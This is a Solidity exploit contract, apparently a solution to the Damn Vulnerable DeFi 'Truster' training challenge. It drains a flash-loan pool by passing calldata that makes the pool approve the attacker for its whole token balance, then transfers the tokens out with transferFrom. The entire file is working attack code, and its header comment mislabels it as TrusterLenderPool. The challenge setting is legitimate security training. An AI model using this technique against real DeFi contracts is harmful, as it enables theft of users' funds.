// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "hardhat/console.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackTruster {
    function drainAllFunds(
        uint256 drainAmount,
        address attacker,
        address token,
        TrusterLenderPool pool
    ) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),drainAmount);
        pool.flashLoan(0,address(this),token,data);
        require(IERC20(token).allowance(address(pool),address(this))==drainAmount,"Failed");
        IERC20(token).transferFrom(address(pool),attacker,drainAmount);
    }
}
